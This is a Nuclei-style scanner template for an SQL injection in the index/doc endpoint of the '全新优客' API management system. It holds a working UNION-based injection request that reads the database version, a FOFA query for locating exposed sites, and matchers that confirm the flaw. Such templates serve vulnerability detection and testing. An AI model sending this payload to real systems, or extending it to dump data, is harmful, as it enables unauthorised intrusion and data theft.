id: youke-api-doc-sqli

info:
  name: 全新优客API接口管理系统doc存在SQL注入漏洞
  author: qwtd
  severity: high
  description: 全新优客API接口管理系统 index/doc 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - https://github.com/wy876/POC/blob/main/%E4%BC%98%E5%AE%A2API%E6%8E%A5%E5%8F%A3%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E5%85%A8%E6%96%B0%E4%BC%98%E5%AE%A2API%E6%8E%A5%E5%8F%A3%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fdoc%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  metadata:
    max-request: 1
    fofa-query: body="public/static/index/css/flaghome.css"
    verified: true
  tags: 全新优客API接口管理系统

http:
  - raw:
      - |-
        @timeout: 30s
        POST /index/index/doc HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
        Content-Type: application/x-www-form-urlencoded
        Connection: close

        id=') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,@@VERSION,NULL-- -    

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - '<code>\d.\d.\d{1,2}-log</code>'

      - type: status
        status:
          - 200

    extractors:
      - type: regex
        regex:
          - '<code>(.*?)-log</code>'
